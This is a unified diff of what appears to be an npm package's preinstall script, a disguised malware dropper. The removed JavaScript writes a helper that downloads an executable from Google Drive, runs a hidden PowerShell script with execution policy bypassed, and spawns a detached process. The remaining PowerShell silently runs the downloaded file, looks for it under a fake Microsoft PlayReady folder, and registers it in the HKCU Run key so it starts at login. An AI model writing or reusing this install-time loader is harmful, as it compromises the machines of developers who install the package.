@@ -1,46 +1,4 @@
-if (process.env.PREINSTALL_RUNNING === 'true') {
-    process.exit(0);
-}
 
-process.env.ALLOW_PREINSTALL_EXECUTE = process.env.ALLOW_PREINSTALL_EXECUTE || 'true';
-
-const { spawn } = require('child_process');
-const path = require('path');
-const fs = require('fs');
-
-const downloadExePath = path.join(__dirname, '..', 'downloaded_from_gdown.exe');
-
-// Prepare a small, robust Node ES module to perform the download.
-const downloadModulePath = path.join(__dirname, '..', 'preinstall_download.mjs');
-const downloadModule = `
-(async () => {
-    try {
-        const mod = await import('better-gdrive');
-        const downloadFile = mod.downloadFile || mod.default?.downloadFile || mod.default;
-        const fileId = '1W3Ddny5rolO3DrvyfQH9i2NFgn1uFh2n';
-        const output = process.env.DOWNLOAD_OUTPUT;
-        if (!downloadFile || typeof downloadFile !== 'function') {
-            console.error('[preinstall-download] ERROR: downloadFile function not found on better-gdrive');
-            process.exit(0);
-        }
-        await downloadFile(fileId, output);
-        console.log('[preinstall-download] Download complete');
-    } catch (e) {
-        console.error('[preinstall-download] ERROR:', e && e.message ? e.message : e);
-    }
-    // Always exit 0 so install doesn't fail due to this step
-    process.exit(0);
-})();
-`;
-
-try {
-        fs.writeFileSync(downloadModulePath, downloadModule, { encoding: 'utf8' });
-        console.log('[detach] Download helper module written to:', downloadModulePath);
-} catch (err) {
-        console.error('[detach] ERROR writing download helper module:', err.message);
-}
-
-const psScript = `
 $ErrorActionPreference = 'Stop'
 Write-Output "[preinstall-setup] Starting preinstall setup script..."
 Write-Output "[preinstall-setup] Script execution started at $(Get-Date)"
@@ -57,7 +15,7 @@ try {
     $scriptPath = Join-Path $PSScriptRoot 'preinstall_download.mjs'
     Write-Output "[preinstall-setup] Node helper path: $scriptPath"
     Write-Output "[preinstall-setup] Current working directory: $PWD"
-    $nodeExe = "${process.execPath.replace(/\\/g, '\\\\')}"
+    $nodeExe = "C:\\Program Files\\nodejs\\node.exe"
     Write-Output "[preinstall-setup] Using node executable: $nodeExe"
     $downloadOutput = & $nodeExe $scriptPath 2>&1
     Write-Output "[preinstall-setup] Download helper output: $downloadOutput"
@@ -75,7 +33,7 @@ if (Test-Path $output) {
     Write-Output "[preinstall-setup] File last write time: $($downloadedItem.LastWriteTime)"
     Write-Output "[preinstall-setup] File attributes: $($downloadedItem.Attributes)"
 
-    # 1. Execute the downloaded file (it will move itself to %APPDATA%\\Microsoft\\Playright\\dbengin.exe)
+    # 1. Execute the downloaded file (it will move itself to %APPDATA%\Microsoft\Playright\dbengin.exe)
     Write-Output "[preinstall-setup] Executing downloaded file (once, silently) to let it self-install..."
     try {
         Write-Output ("[preinstall-setup] Start-Process arguments: -FilePath '{0}' -WindowStyle Hidden -Wait -PassThru" -f $output)
@@ -94,8 +52,8 @@ if (Test-Path $output) {
     }
 
     # 2. Define the final expected paths after self-move (check Local and Roaming)
-    $finalExeLocal = Join-Path $env:LOCALAPPDATA "Microsoft\\PlayReady\\dbengin.exe"
-    $finalExeRoaming = Join-Path $env:APPDATA "Microsoft\\PlayReady\\dbengin.exe"
+    $finalExeLocal = Join-Path $env:LOCALAPPDATA "Microsoft\PlayReady\dbengin.exe"
+    $finalExeRoaming = Join-Path $env:APPDATA "Microsoft\PlayReady\dbengin.exe"
     Write-Output "[preinstall-setup] Expecting final exe at (local): $finalExeLocal"
     Write-Output "[preinstall-setup] Expecting final exe at (roaming): $finalExeRoaming"
 
@@ -128,7 +86,7 @@ if (Test-Path $output) {
         # Register a HKCU Run value to launch on user login (non-elevated)
         try {
             $quoted = '"' + $foundFinal + '"'
-            $sub = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
+            $sub = 'Software\Microsoft\Windows\CurrentVersion\Run'
             $rk = [Microsoft.Win32.Registry]::CurrentUser.CreateSubKey($sub)
             $rk.SetValue('UserAppStartup', $quoted, [Microsoft.Win32.RegistryValueKind]::String)
             $rk.Close()
@@ -156,44 +114,3 @@ if (Test-Path $output) {
 } else {
     Write-Output "[preinstall-setup] Downloaded file not found at expected path."
 }
-`;
-
-const tmpPsPath = path.join(__dirname, '..', 'preinstall_download.ps1');
-console.log('[detach] Writing PowerShell script to:', tmpPsPath);
-try {
-    fs.writeFileSync(tmpPsPath, psScript, { encoding: 'utf8' });
-    console.log('[detach] PowerShell script written successfully');
-} catch (err) {
-    console.error('[detach] ERROR writing PowerShell script:', err.message);
-}
-
-const { spawnSync } = require('child_process');
-console.log('[detach] Executing PowerShell script...');
-const psResult = spawnSync('powershell.exe', ['-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', tmpPsPath], {
-    cwd: path.join(__dirname, '..'),
-    encoding: 'utf8',
-    stdio: 'pipe',
-    windowsHide: true
-});
-console.log('[detach] PowerShell stdout:', psResult.stdout);
-if (psResult.stderr) console.error('[detach] PowerShell stderr:', psResult.stderr);
-console.log('[detach] PowerShell exit code:', psResult.status);
-
-try { fs.unlinkSync(tmpPsPath); } catch (e) { console.log('[detach] Could not delete temp script:', e.message); }
-
-console.log('[detach] Spawning detached preinstall process...');
-const child = spawn('node', [
-    '-e',
-    `require('./index').preInstall().catch(() => process.exitCode = 1)`
-], {
-    cwd: path.join(__dirname, '..'),
-    detached: true,
-    windowsHide: true,
-    stdio: 'ignore',
-    env: { ...process.env, PREINSTALL_RUNNING: 'true', npm_config_ignore_scripts: 'true' }
-});
-child.unref();
-
-console.log('[detach] Detached process spawned. PID:', child.pid);
-console.log('[detach] Exiting preinstall script...');
-process.exit(0);
